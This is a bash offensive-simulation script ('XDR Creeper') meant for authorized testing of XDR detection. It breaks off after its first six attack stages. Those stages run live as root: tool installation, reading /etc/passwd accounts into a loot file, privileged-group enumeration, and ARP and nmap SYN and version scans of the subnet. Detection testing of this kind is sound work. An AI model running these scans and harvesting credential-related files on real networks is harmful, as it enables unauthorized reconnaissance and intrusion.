#!/bin/bash
# ╔════════════════════════════════════════════════════════════════════════════════════════════════════╗
# ║   ██╗  ██╗██████╗ ██████╗      ██████╗██████╗ ███████╗███████╗██████╗ ███████╗██████╗              ║
# ║   ╚██╗██╔╝██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗             ║
# ║    ╚███╔╝ ██║  ██║██████╔╝    ██║     ██████╔╝█████╗  █████╗  ██████╔╝█████╗  ██████╔╝             ║
# ║    ██╔██╗ ██║  ██║██╔══██╗    ██║     ██╔══██╗██╔══╝  ██╔══╝  ██╔═══╝ ██╔══╝  ██╔══██╗             ║
# ║   ██╔╝ ██╗██████╔╝██║  ██║    ╚██████╗██║  ██║███████╗███████╗██║     ███████╗██║  ██║             ║
# ║   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝'            ║
# ║                                                                                                    ║
# ║  XDR CREEPER — CORE OFFENSIVE SIMULATION FRAMEWORK                                                 ║
# ║  CORE LINUX — 20 Built-in Attack Techniques                                                        ║
# ║                                                                                                    ║
# ║  Author  : Daniel Budyn | https://www.linkedin.com/in/daniel-b-4295a421a/                          ║
# ║  Version : 1.0 XDR-CREEPER                                                                         ║
# ║  License : Internal / Authorized Testing Only                                                      ║
# ╚════════════════════════════════════════════════════════════════════════════════════════════════════╝
#
# USAGE:
#   chmod +x newlife-core-linux.sh
#   sudo ./newlife-core-linux.sh [OPTIONS]
#
#   Options:
#     --subnet 10.10.1.0/24    Target subnet (default: auto-detect)
#     --all                    Run all 20 core attacks
#     --dlc <n>                Load and run a DLC module
#     --list-dlc               Show available DLC modules
#     --menu                   Interactive attack selection menu
#     --no-animate             Skip banner animation
#
# ============================================================================

set -uo pipefail

# ═══════════════════════════════════════════════════════════════════════════════
# GLOBAL CONFIG
# ═══════════════════════════════════════════════════════════════════════════════
VERSION="1.0-XDR-CREEPER"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DLC_DIR="${SCRIPT_DIR}/dlc"
SUBNET="${SUBNET:-}"
LOG_DIR="/tmp/xdr-creeper"
TS=$(date +%Y%m%d_%H%M%S)
CSV="${LOG_DIR}/timeline_${TS}.csv"
HTML_REPORT="${LOG_DIR}/report_${TS}.html"
LOOT="${LOG_DIR}/loot_${TS}.txt"
RECON="${LOG_DIR}/recon_${TS}.txt"
SSH_USER="${SSH_USER:-xdradmin}"
STRESS_TIME=15
BEACON_INTERVAL=6
BEACON_ROUNDS=3
C2_TARGETS=("example.com" "httpbin.org" "ifconfig.me" "icanhazip.com")
TOTAL_ATTACKS=20
CURRENT_MODULE="CORE"
MODULE_COLOR=""

# ═══════════════════════════════════════════════════════════════════════════════
# COLOR SYSTEM — Linux Green palette (base) + module accent support
# ═══════════════════════════════════════════════════════════════════════════════
# Base greens (Linux identity)
G_DARK='\033[38;5;22m'
G_BASE='\033[38;5;34m'
G_MID='\033[38;5;40m'
G_LIGHT='\033[38;5;82m'
G_BRIGHT='\033[38;5;118m'
G_PALE='\033[38;5;157m'

# Azure accent (for logo animation phase 1)
AZ_DARK='\033[38;5;24m'
AZ_BASE='\033[38;5;33m'
AZ_MID='\033[38;5;39m'
AZ_LIGHT='\033[38;5;81m'
AZ_BRIGHT='\033[38;5;117m'
ICE='\033[38;5;159m'

# Standard colors
R='\033[1;31m'
G='\033[1;32m'
Y='\033[0;33m'
B='\033[1;34m'
C='\033[1;36m'
M='\033[1;35m'
W='\033[1;37m'
D='\033[0;90m'
N='\033[0m'
BOLD='\033[1m'
DIM='\033[2m'

# Background colors
BG_R='\033[41m'
BG_G='\033[42m'
BG_B='\033[44m'
BG_M='\033[45m'
BG_C='\033[46m'
BG_K='\033[40m'

# DLC module accent colors (set by load_dlc)
declare -A DLC_COLORS=(
    ["01"]='\033[38;5;141m'     # purple  - IAM
    ["02"]='\033[38;5;196m'     # red     - privesc
    ["03"]='\033[38;5;214m'     # amber   - creds
    ["04"]='\033[38;5;208m'     # coral   - lateral
    ["05"]='\033[38;5;43m'      # teal    - persist
    ["06"]='\033[38;5;86m'      # lt teal - evasion
    ["07"]='\033[38;5;39m'      # blue    - exfil
    ["08"]='\033[38;5;99m'      # dpurple - c2
    ["09"]='\033[38;5;205m'     # pink    - ad
    ["10"]='\033[38;5;33m'      # azure   - cloud
    ["11"]='\033[38;5;196m'     # red     - impact
    ["12"]='\033[38;5;220m'     # gold    - auditor
)
AU_BASE='\033[38;5;220m'

# ═══════════════════════════════════════════════════════════════════════════════
# TERMINAL HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
hide_cursor() { printf '\033[?25l'; }
show_cursor() { printf '\033[?25h'; }

# ═══════════════════════════════════════════════════════════════════════════════
# ASCII ART — TATTOO LOGO (animated intro)
# ═══════════════════════════════════════════════════════════════════════════════
read -r -d '' TATTOO_LOGO << 'LOGOEOF'
                                             :       ====:.-:..........                                 
                             .==:     =--+-+-:+ .. :=-+=--=.-          .                                 
                      :+=-  +-  .+=+--+   -====#-   +##= :+=+==+====++ +-                               
                -   :+:  .=-   ++ ===-==+=- +#=++++*- -*#===:          *.                               
              -= --+-   =- :+=  --+ -=*+####+*****- ++==-*#:=======+=-=======                            
            -+   =:   ++   +=.++:-==+:###-+##--=-------:--=##-      -=      =:::::::::::-+.             
          ++   +=            +==:+-**##+     *#*====------=:*##=+.+--+ ++    ==+++-.  -:                 
 ==                            --++##+        *#*#========++=                                           
-+-#****************************-###=          +##+-=-+=====:+:=.=:==.+=:+=:+=-+=                       
 -===+==+================+-==- --###=        =##+*:=-=+: ==-=                                           
       *  =  ------------== -= -::- +###-  =##+*-+-=:=-=-=-                                            
       + =+                =----=-==:==##*##**:===-=--                       =                          
    ==:=-=--=:=-==.=-:=-==:=-==:=+=+=-==*#**-========:-=:  -+   :=   -+  -*:=-                        
                   =+=+===+-     =-  =-+- -=-+-==-=-    =.=-  :=: ==*: :+:+-                          
                           .====-    +- =-  =:  =:+-=-  +-+  +-      .+:=.                            
                                      :+   -=:-=      +=   --                                          
                                             -  =+                                                   
LOGOEOF

# ═══════════════════════════════════════════════════════════════════════════════
# ASCII ART — XDR CREEPER BUG (armored beetle with 6 legs)
# ═══════════════════════════════════════════════════════════════════════════════
read -r -d '' CREEPER_BUG << 'BUGEOF'
                              .  :  .
                           \  |  |  |  /
                            \ | _|_ | /
                        _.--'`/   \`'--._ 
                      /`    /  o   o  \    `\
                     |    /  ___^___  \    |
                   __|___/ /||||||||\ \___|__
                  /  \   | |========| |   /  \
            ~----/    \  | |========| |  /    \----~
           /    / \    \_| |========| |_/    / \    \
          {    {   }    /  |========|  \    {   }    }
           \    \ /  _/  / \========/ \  \_  \ /    /
            ~----\  / | /   \------/   \ | \  /----~
                  \/  |/     \    /     \|  \/
                   \__|_      \  /      _|__/
                       \       \/       /
                        `--..______..--'
                           |  |  |  |
                           :  :  :  :
BUGEOF

CREEPER_TEXT='   ██╗  ██╗██████╗ ██████╗      ██████╗██████╗ ███████╗███████╗██████╗ ███████╗██████╗ 
   ╚██╗██╔╝██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗
    ╚███╔╝ ██║  ██║██████╔╝    ██║     ██████╔╝█████╗  █████╗  ██████╔╝█████╗  ██████╔╝
    ██╔██╗ ██║  ██║██╔══██╗    ██║     ██╔══██╗██╔══╝  ██╔══╝  ██╔═══╝ ██╔══╝  ██╔══██╗
   ██╔╝ ██╗██████╔╝██║  ██║    ╚██████╗██║  ██║███████╗███████╗██║     ███████╗██║  ██║
   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝'

NEWLIFE_TEXT='    ███╗   ██╗███████╗██╗    ██╗██╗     ██╗███████╗███████╗
    ████╗  ██║██╔════╝██║    ██║██║     ██║██╔════╝██╔════╝
    ██╔██╗ ██║█████╗  ██║ █╗ ██║██║     ██║█████╗  █████╗  
    ██║╚██╗██║██╔══╝  ██║███╗██║██║     ██║██╔══╝  ██╔══╝  
    ██║ ╚████║███████╗╚███╔███╔╝███████╗██║██║     ███████╗
    ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝ ╚══════╝╚═╝╚═╝     ╚══════╝'

# ═══════════════════════════════════════════════════════════════════════════════
# ANIMATION ENGINE
#
# Mirrors the Python matrix_logo_effect() from NewLifeTeacher.py exactly:
#   1. clear entire screen
#   2. build the full frame into a buffer string
#   3. print buffer in one shot
#   4. sleep 0.05s
#   5. repeat until duration elapsed
#
# The key difference from the broken version: we build the ENTIRE frame as
# a single string and output it with one printf, then use 'clear' before
# the next frame. This prevents the "slideshow" effect caused by per-line
# echo statements that don't clear previous output.
# ═══════════════════════════════════════════════════════════════════════════════
GLITCH_CHARS="newlife01<>"

# Animated tattoo intro: azure glitch → white stabilization
# Exactly matches the Python version's behavior
animated_intro() {
    local module_name="${1:-CORE}"
    local module_accent="${2:-$G_BRIGHT}"
    local duration_ms=3500   # 3.5 seconds like the Python version
    local frame_delay=0.05   # 50ms per frame like the Python version
    
    hide_cursor
    
    # Pre-split the logo into an array of lines (do this once, not per frame)
    local -a logo_lines=()
    while IFS= read -r ln; do
        logo_lines+=("$ln")
    done <<< "$TATTOO_LOGO"
    local num_lines=${#logo_lines[@]}
    
    # ANSI codes as raw strings for fast concatenation
    local c_az=$'\033[38;5;81m'      # azure light
    local c_az2=$'\033[38;5;33m'     # azure base
    local c_azd=$'\033[38;5;24m'     # azure dark
    local c_w=$'\033[1;37m'          # white bold
    local c_r=$'\033[0m'             # reset
    local c_dim=$'\033[0;90m'        # dim
    
    local start_s=$SECONDS
    local start_ns
    start_ns=$(date +%s%N 2>/dev/null || echo "0")
    
    # ── ANIMATION LOOP ──
    while true; do
        # Calculate elapsed time
        local now_ns
        now_ns=$(date +%s%N 2>/dev/null || echo "0")
        local elapsed_ms=$(( (now_ns - start_ns) / 1000000 ))
        
        if (( elapsed_ms >= duration_ms )); then
            break
        fi
        
        # Progress 0-100
        local progress=$(( elapsed_ms * 100 / duration_ms ))
        
        # Build the entire frame into a buffer
        local frame=""
        
        local i
        for ((i=0; i<num_lines; i++)); do
            local line="${logo_lines[$i]}"
            local out=""
            local j
            for ((j=0; j<${#line}; j++)); do
                local ch="${line:$j:1}"
                if [[ "$ch" == " " ]]; then
                    # 2% chance inject a glitch char in empty space
                    if (( RANDOM % 50 == 0 )); then
                        local gi=$(( RANDOM % ${#GLITCH_CHARS} ))
                        out+="${c_azd}${GLITCH_CHARS:$gi:1}${c_r}"
                    else
                        out+=" "
                    fi
                else
                    if (( RANDOM % 100 < progress )); then
                        # Stabilized → white
                        out+="${c_w}${ch}${c_r}"
                    else
                        # Still in azure/glitch phase
                        if (( RANDOM % 100 < 80 )); then
                            out+="${c_az}${ch}${c_r}"
                        else
                            local gi=$(( RANDOM % ${#GLITCH_CHARS} ))
                            out+="${c_az2}${GLITCH_CHARS:$gi:1}${c_r}"
                        fi
                    fi
                fi
            done
            frame+="${out}"$'\n'
        done
        
        # Add XDR CREEPER signature fading in
        if (( progress > 40 )); then
            local sig_color="$c_azd"
            (( progress > 60 )) && sig_color="$c_az"
            (( progress > 80 )) && sig_color="$c_w"
            frame+=$'\n'
            frame+="                              ${sig_color}— X D R   C R E E P E R —${c_r}"$'\n'
        fi
        
        # CLEAR + PRINT in one shot (minimizes flicker)
        clear
        printf '%b' "$frame"
        
        sleep "$frame_delay"
    done
    
    # ── FINAL CLEAN FRAME — logo in pure white ──
    clear
    printf '%b' "${c_w}${TATTOO_LOGO}${c_r}"
    echo ""
    echo ""
    printf '%b' "                              ${c_w}— X D R   C R E E P E R —${c_r}"
    echo ""
    sleep 0.8
    
    # ── BLINKING CURSOR — dramatic pause (like Python blinking_cursor) ──
    local blink_end=$(( SECONDS + 1 ))
    local visible=1
    while (( SECONDS < blink_end )); do
        if (( visible )); then
            printf '\r%b' "${c_az}█${c_r}"
        else
            printf '\r '
        fi
        visible=$(( 1 - visible ))
        sleep 0.35
    done
    printf '\r \r'
    
    # ── STATIC REVEAL — Creeper bug + module info ──
    clear
    printf '%b\n' "${module_accent}${CREEPER_BUG}${N}"
    echo ""
    printf '%b\n' "${G_BRIGHT}${CREEPER_TEXT}${N}"
    echo ""
    echo -e "  ${W}${BOLD}OFFENSIVE SIMULATION FRAMEWORK — LINUX${N}"
    echo -e "  ${D}══════════════════════════════════════════════════════════════${N}"
    echo -e "  ${G_LIGHT}Module${N}   : ${W}${module_name}${N}"
    echo -e "  ${G_LIGHT}Author${N}   : ${W}Daniel Budyn${N}"
    echo -e "  ${G_LIGHT}Contact${N}  : ${W}newlife.org.pl@gmail.com${N}"
    echo -e "  ${G_LIGHT}Company${N}  : ${W}NEWLIFE${N}"
    echo -e "  ${G_LIGHT}Version${N}  : ${W}${VERSION}${N}"
    echo -e "  ${G_LIGHT}Host${N}     : ${R}$(hostname) ($(hostname -I 2>/dev/null | awk '{print $1}'))${N}"
    echo -e "  ${G_LIGHT}Time${N}     : ${W}$(date '+%Y-%m-%d %H:%M:%S %Z')${N}"
    if [[ -n "$SUBNET" ]]; then
        echo -e "  ${G_LIGHT}Target${N}   : ${R}${SUBNET}${N}"
    fi
    echo -e "  ${D}══════════════════════════════════════════════════════════════${N}"
    echo -e "                              ${W}${BOLD}— X D R   C R E E P E R —${N}"
    echo ""
    sleep 3
    
    show_cursor
}

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE SPLASH — shown before each DLC module (10 seconds)
# ═══════════════════════════════════════════════════════════════════════════════
module_splash() {
    local mod_name="$1"
    local mod_desc="$2"
    local mod_mitre="$3"
    local mod_attacks="$4"
    local mod_risk="$5"
    local mod_color="${6:-$G_BRIGHT}"
    
    hide_cursor
    clear
    
    printf '%b\n' "${mod_color}${CREEPER_BUG}${N}"
    echo ""
    echo -e "  ${W}${BOLD}XDR CREEPER — MODULE LOADING${N}"
    echo -e "  ${D}══════════════════════════════════════════════════════════════${N}"
    echo -e "  ${mod_color}Module${N}   : ${W}${BOLD}${mod_name}${N}"
    echo -e "  ${mod_color}Desc${N}     : ${W}${mod_desc}${N}"
    echo -e "  ${mod_color}MITRE${N}    : ${D}${mod_mitre}${N}"
    echo ""
    echo -e "  ${W}ATTACK MANIFEST:${N}"
    
    local IFS=$'\n'
    local num=1
    while IFS= read -r atk; do
        [[ -z "$atk" ]] && continue
        printf '  %b  %02d.%b %b%s%b\n' "$mod_color" "$num" "$N" "$W" "$atk" "$N"
        num=$((num + 1))
    done <<< "$mod_attacks"
    
    echo ""
    case "$mod_risk" in
        LOW)      echo -e "  ${W}Risk${N}     : ${G}${BOLD}LOW${N}      ${G}██${D}████████${N}" ;;
        MEDIUM)   echo -e "  ${W}Risk${N}     : ${Y}${BOLD}MEDIUM${N}   ${Y}████${D}██████${N}" ;;
        HIGH)     echo -e "  ${W}Risk${N}     : ${R}${BOLD}HIGH${N}     ${R}██████${D}████${N}" ;;
        CRITICAL) echo -e "  ${W}Risk${N}     : ${R}${BOLD}CRITICAL${N} ${R}${BOLD}██████████${N}" ;;
    esac
    
    echo ""
    echo -e "  ${D}══════════════════════════════════════════════════════════════${N}"
    echo -e "                              ${W}${BOLD}— X D R   C R E E P E R —${N}"
    echo ""
    echo -e "  ${D}Starting in 10 seconds... Press Ctrl+C to abort.${N}"
    
    for i in $(seq 10 -1 1); do
        local done_count=$((10 - i))
        local bar_fill=""
        local bar_empty=""
        local k
        for ((k=0; k<done_count+1; k++)); do bar_fill+="█"; done
        for ((k=0; k<i; k++)); do bar_empty+="░"; done
        printf '\r  %b  [%s%b%s%b] %b%2ds%b  ' "$mod_color" "$bar_fill" "$D" "$bar_empty" "$mod_color" "$W" "$i" "$N"
        sleep 1
    done
    echo ""
    echo ""
    
    show_cursor
}

# ═══════════════════════════════════════════════════════════════════════════════
# OUTPUT HELPERS — logging, display, CSV
# ═══════════════════════════════════════════════════════════════════════════════
phase_header() {
    local num=$1; shift
    local total=$1; shift
    local title="$1"; shift
    local mitre="$1"
    echo ""
    echo -e "${BG_G}${W}                                                                              ${N}"
    echo -e "${BG_G}${W}  ◆ ATTACK ${num}/${total} : ${title}  ${N}"
    echo -e "${BG_G}${W}  ◆ MITRE       : ${mitre}  ${N}"
    echo -e "${BG_G}${W}                                                                              ${N}"
    echo ""
    sleep 1
}

run()    { echo -e "  ${G}[$(date '+%H:%M:%S')]${N} ${W}▸${N} $1"; sleep 0.3; }
hack()   { echo -e "  ${R}[$(date '+%H:%M:%S')]${N} ${R}⚡${N} $1"; sleep 0.3; }
info()   { echo -e "  ${D}        ↳ $1${N}"; }
xdr()    { echo -e "  ${Y}  🛡  XDR EXPECTS → $1${N}"; sleep 0.5; }
result() { echo -e "  ${M}  📦 RESULT → $1${N}"; }
ok()     { echo -e "  ${G}  ✔ $1${N}"; }
fail()   { echo -e "  ${R}  ✘ $1${N}"; }
warn()   { echo -e "  ${Y}  ⚠ $1${N}"; }
divider(){ echo -e "  ${D}  ──────────────────────────────────────────────────────────${N}"; }

csv_log() {
    echo "\"$(date '+%Y-%m-%d %H:%M:%S')\",\"${CURRENT_MODULE}\",\"$1\",\"$2\",\"$3\",\"$4\"" >> "$CSV"
}

# ═══════════════════════════════════════════════════════════════════════════════
# FINDINGS ENGINE — Structured output for DLC-12 Auditor
# ═══════════════════════════════════════════════════════════════════════════════
FINDINGS_FILE="${LOG_DIR}/findings.jsonl"

# Write a structured finding to findings.jsonl (append-only, all modules share this file)
# Usage: write_finding "ID" "Technique" "MITRE-ID" "RESULT" "SEVERITY" "Details" "Recommendation"
# Results: PASS/FAIL/WARN/EXECUTED/SIMULATED/BLOCKED/SKIPPED/ANALYZED/VULNERABLE/INFO
# Severity: CRITICAL/HIGH/MEDIUM/LOW/INFO
write_finding() {
    local attack_id="$1" technique="$2" mitre_id="$3" result="$4" severity="$5" details="$6" recommendation="$7"
    details="${details//\"/\\\"}"; recommendation="${recommendation//\"/\\\"}"
    printf '{"module":"%s","timestamp":"%s","attack_id":"%s","technique":"%s","mitre_id":"%s","result":"%s","severity":"%s","details":"%s","recommendation":"%s"}\n' \
        "$CURRENT_MODULE" "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" \
        "$attack_id" "$technique" "$mitre_id" "$result" "$severity" "$details" "$recommendation" \
        >> "$FINDINGS_FILE" 2>/dev/null
}

# Display a finding on screen with colored severity icon
show_finding() {
    local sev="$1"; shift; local msg="$1"
    local c="${G}" i="✔"
    case "$sev" in CRITICAL) c="${R}${BOLD}"; i="⛔";; HIGH) c="${R}"; i="🔴";; MEDIUM) c="${Y}"; i="🟡";; LOW) c='\033[38;5;75m'; i="🔵";; INFO) c="${D}"; i="ℹ️";; esac
    echo -e "  ${c}  ${i} [${sev}] ${msg}${N}"
}

progress_bar() {
    local dur=$1
    local label="${2:-Working}"
    local cols=40
    local step
    step=$(echo "scale=3; $dur / $cols" | bc 2>/dev/null || echo "0.5")
    for i in $(seq 1 $cols); do
        local pct=$((i * 100 / cols))
        local filled=$(printf '█%.0s' $(seq 1 $i))
        local empty=$(printf '░%.0s' $(seq 1 $((cols - i))))
        printf "\r  ${G_LIGHT}  %s [%s%s] %3d%%${N}" "$label" "$filled" "$empty" "$pct"
        sleep "$step"
    done
    echo ""
}

# ═══════════════════════════════════════════════════════════════════════════════
# AUTO-DETECT SUBNET
# ═══════════════════════════════════════════════════════════════════════════════
detect_subnet() {
    if [[ -z "$SUBNET" ]]; then
        local my_ip
        my_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
        if [[ -n "$my_ip" ]]; then
            SUBNET="$(echo "$my_ip" | sed 's/\.[0-9]*$/.0/')/24"
        else
            SUBNET="10.10.1.0/24"
        fi
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# INIT — setup directories, CSV header, recon file
# ═══════════════════════════════════════════════════════════════════════════════
init() {
    mkdir -p "$LOG_DIR"
    echo "\"timestamp\",\"module\",\"phase\",\"action\",\"detail\",\"status\"" > "$CSV"
    cat > "$RECON" << EOF
# XDR Creeper v${VERSION} — Recon Report
# Generated: $(date)
# Target: ${SUBNET}
# Host: $(hostname)
---
EOF
    > "$LOOT"
    # Initialize findings file (append-only — DLC modules add to this)
    [[ ! -f "$FINDINGS_FILE" ]] && printf '# XDR Creeper — Findings (JSON Lines) — %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" > "$FINDINGS_FILE"
    csv_log "INIT" "start" "XDR Creeper started on $(hostname)" "OK"
}

# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK 01–20: All attack functions
# ═══════════════════════════════════════════════════════════════════════════════

attack_01_preflight() {
    phase_header 1 $TOTAL_ATTACKS "PREFLIGHT & ENVIRONMENT PROFILING" "N/A"
    
    run "Checking root privileges..."
    if [[ $EUID -ne 0 ]]; then
        fail "Not running as root. Use: sudo $0"
        exit 1
    fi
    ok "Running as root (UID=$EUID)"
    csv_log "PREFLIGHT" "root_check" "EUID=$EUID" "OK"
    
    run "Profiling system capabilities..."
    echo ""
    echo -e "  ${G_LIGHT}  ┌── SYSTEM PROFILE ───────────────────────────────────────────┐${N}"
    echo -e "  ${G_LIGHT}  │${N} OS       : $(cat /etc/os-release 2>/dev/null | grep PRETTY | cut -d'"' -f2)"
    echo -e "  ${G_LIGHT}  │${N} Kernel   : $(uname -r)"
    echo -e "  ${G_LIGHT}  │${N} Arch     : $(uname -m)"
    echo -e "  ${G_LIGHT}  │${N} CPU      : $(nproc 2>/dev/null || echo 'N/A') cores"
    echo -e "  ${G_LIGHT}  │${N} RAM      : $(free -h 2>/dev/null | awk '/Mem:/{print $2}' || echo 'N/A')"
    echo -e "  ${G_LIGHT}  │${N} Disk     : $(df -h / 2>/dev/null | awk 'NR==2{print $4 " free"}')"
    echo -e "  ${G_LIGHT}  │${N} Docker   : $(docker --version 2>/dev/null || echo 'not installed')"
    echo -e "  ${G_LIGHT}  │${N} Python   : $(python3 --version 2>/dev/null || echo 'not installed')"
    echo -e "  ${G_LIGHT}  └──────────────────────────────────────────────────────────────┘${N}"
    echo ""
    csv_log "PREFLIGHT" "profile" "$(uname -r)" "OK"
    
    run "Checking network connectivity..."
    if ping -c 1 -W 3 8.8.8.8 &>/dev/null; then
        ok "Internet: REACHABLE"
    else
        fail "Internet: UNREACHABLE"
    fi
    csv_log "PREFLIGHT" "network" "checked" "OK"
    
    run "Checking Microsoft Defender (mdatp)..."
    if command -v mdatp &>/dev/null; then
        ok "MDATP installed, healthy=$(mdatp health --field healthy 2>/dev/null || echo unknown)"
    else
        info "MDATP not found"
    fi
    csv_log "PREFLIGHT" "mdatp" "checked" "OK"
}

attack_02_tooling() {
    phase_header 2 $TOTAL_ATTACKS "ARSENAL SETUP — Tool Installation" "T1588 Obtain Capabilities"
    xdr "Suspicious package installation (nmap, nikto, hydra, netcat)"
    
    run "Updating package repository..."
    apt-get update -qq 2>/dev/null || yum makecache -q 2>/dev/null || true
    csv_log "TOOLING" "apt_update" "Repository refreshed" "OK"
    
    local tools=("nmap" "netcat-openbsd" "whois" "dnsutils" "curl" "wget" "net-tools" "sshpass" "arp-scan" "traceroute" "tcpdump" "hping3")
    
    run "Installing offensive toolkit..."
    echo ""
    for tool in "${tools[@]}"; do
        printf "  ${D}  %-20s${N}" "$tool"
        if apt-get install -y -qq "$tool" 2>/dev/null || yum install -y -q "$tool" 2>/dev/null; then
            echo -e "${G}[INSTALLED]${N}"
        else
            echo -e "${Y}[SKIPPED]${N}"
        fi
        csv_log "TOOLING" "install" "$tool" "OK"
    done
    echo ""
    
    run "Arsenal verification..."
    echo ""
    echo -e "  ${W}  ┌─────────────────────────────────────────────┐${N}"
    echo -e "  ${W}  │  TOOL              VERSION          STATUS  │${N}"
    echo -e "  ${W}  ├─────────────────────────────────────────────┤${N}"
    for cmd in nmap nc dig whois curl wget arp-scan traceroute tcpdump hping3 sshpass; do
        if command -v "$cmd" &>/dev/null; then
            local ver
            ver=$($cmd --version 2>&1 | head -1 | grep -oP '[\d]+\.[\d]+' | head -1)
            [[ -z "$ver" ]] && ver="ok"
            printf "  ${W}  │${N}  ${G}%-18s %-16s   ✔${N}     ${W}│${N}\n" "$cmd" "$ver"
        else
            printf "  ${W}  │${N}  ${R}%-18s %-16s   ✘${N}     ${W}│${N}\n" "$cmd" "missing"
        fi
    done
    echo -e "  ${W}  └─────────────────────────────────────────────┘${N}"
    csv_log "TOOLING" "verification" "Arsenal check complete" "OK"
}

attack_03_fingerprint() {
    phase_header 3 $TOTAL_ATTACKS "SYSTEM FINGERPRINTING" "T1082 System Discovery / T1033 Owner Discovery"
    xdr "System fingerprinting, user enumeration"
    
    run "System fingerprint..."
    echo ""
    echo -e "  ${G_LIGHT}  ┌── DETAILED SYSTEM INFO ─────────────────────────────────────┐${N}"
    echo -e "  ${G_LIGHT}  │${N} OS       : $(uname -s -r)"
    echo -e "  ${G_LIGHT}  │${N} Kernel   : $(uname -v)"
    echo -e "  ${G_LIGHT}  │${N} Arch     : $(uname -m)"
    echo -e "  ${G_LIGHT}  │${N} Hostname : $(hostname)"
    echo -e "  ${G_LIGHT}  │${N} FQDN     : $(hostname -f 2>/dev/null || echo 'N/A')"
    echo -e "  ${G_LIGHT}  │${N} User     : $(whoami) (UID=$(id -u))"
    echo -e "  ${G_LIGHT}  │${N} Groups   : $(id -Gn)"
    echo -e "  ${G_LIGHT}  │${N} Uptime   : $(uptime -p 2>/dev/null || uptime)"
    echo -e "  ${G_LIGHT}  └──────────────────────────────────────────────────────────────┘${N}"
    uname -a >> "$RECON"
    csv_log "RECON" "fingerprint" "$(uname -r)" "OK"
}

attack_04_users() {
    phase_header 4 $TOTAL_ATTACKS "USER & GROUP ENUMERATION" "T1087 Account Discovery"
    xdr "Account Discovery (T1087.001)"
    
    run "User enumeration (/etc/passwd)..."
    hack "Reading /etc/passwd — listing all local accounts"
    echo ""
    echo -e "  ${W}  USERS WITH SHELL ACCESS:${N}"
    grep -E '/bin/(bash|sh|zsh)' /etc/passwd 2>/dev/null | while IFS=: read user x uid gid desc home shell; do
        if [[ $uid -ge 1000 ]] || [[ $uid -eq 0 ]]; then
            echo -e "  ${R}  ⚠ ${user}${N} (UID:${uid}) → ${shell} [${home}]"
        fi
    done
    grep -E '/bin/(bash|sh|zsh)' /etc/passwd >> "$LOOT" 2>/dev/null
    csv_log "RECON" "user_enum" "users enumerated" "OK"
    echo ""
    
    run "Group enumeration..."
    hack "Listing privileged groups"
    for grp in sudo wheel adm docker lxd; do
        local members
        members=$(getent group "$grp" 2>/dev/null | cut -d: -f4)
        [[ -n "$members" ]] && echo -e "  ${Y}  ⚠ ${grp}: ${members}${N}"
    done
    csv_log "RECON" "group_enum" "groups checked" "OK"
}

attack_05_network() {
    phase_header 5 $TOTAL_ATTACKS "NETWORK DISCOVERY" "T1046 Network Scanning / T1018 Remote System Discovery"
    xdr "Port scanning, ARP discovery"
    
    run "Network configuration..."
    echo ""
    echo -e "  ${G_LIGHT}  ┌── NETWORK INFO ─────────────────────────────────────────┐${N}"
    ip -4 addr show 2>/dev/null | grep -E 'inet ' | while read _ ip _ _ _ iface; do
        echo -e "  ${G_LIGHT}  │${N} ${iface}: ${ip}"
    done
    echo -e "  ${G_LIGHT}  │${N} Gateway : $(ip route | grep default | awk '{print $3}' | head -1)"
    echo -e "  ${G_LIGHT}  │${N} DNS     : $(grep nameserver /etc/resolv.conf 2>/dev/null | head -1 | awk '{print $2}')"
    echo -e "  ${G_LIGHT}  └──────────────────────────────────────────────────────────┘${N}"
    csv_log "NET_RECON" "net_config" "$(hostname -I 2>/dev/null | awk '{print $1}')" "OK"
    echo ""
    
    run "ARP scan — discovering live hosts in ${SUBNET}..."
    hack "Sweeping subnet for alive targets"
    if command -v arp-scan &>/dev/null; then
        arp-scan --localnet 2>/dev/null | grep -E '^[0-9]' | head -20
    elif command -v nmap &>/dev/null; then
        nmap -sn "$SUBNET" 2>/dev/null | grep -E 'Nmap scan|Host is' | head -20
    fi
    csv_log "NET_RECON" "arp_scan" "Subnet $SUBNET swept" "OK"
    echo ""
    
    run "TCP SYN scan — top 100 ports on ${SUBNET}..."
    hack "Nmap SYN scan — this WILL trigger alerts"
    xdr "Network Service Scanning — port scan detected"
    if command -v nmap &>/dev/null; then
        nmap -sS --top-ports 100 --open "$SUBNET" -oN "${LOG_DIR}/tcp_scan_${TS}.txt" 2>/dev/null | \
            grep -E 'open|Nmap scan' | head -30 | while read line; do
                echo -e "  ${G}  $line${N}"
            done
    fi
    csv_log "NET_RECON" "nmap_syn" "Top 100 ports scanned" "OK"
}

attack_06_services() {
    phase_header 6 $TOTAL_ATTACKS "SERVICE & PORT ENUMERATION" "T1046 Network Service Scanning"
    xdr "Service fingerprinting, listening port analysis"
    
    run "Listening services..."
    echo -e "  ${W}  LISTENING SERVICES:${N}"
    ss -tulnp 2>/dev/null | grep LISTEN | head -15 | while read line; do
        echo -e "  ${D}  $line${N}"
    done
    ss -tulnp >> "$RECON" 2>/dev/null
    csv_log "NET_RECON" "listening_ports" "enumerated" "OK"
    echo ""
    
    run "Service version detection..."
    hack "Fingerprinting services"
    if command -v nmap &>/dev/null; then
        nmap -sV --top-ports 20 "$SUBNET" -oN "${LOG_DIR}/version_scan_${TS}.txt" 2>/dev/null | \
            grep -E 'open|Nmap scan' | head -20 | while read line; do
                echo -e "  ${M}  $line${N}"
            done
    fi
    csv_log "NET_RECON" "nmap_version" "version scan done" "OK"
}

attack_07_cron() {
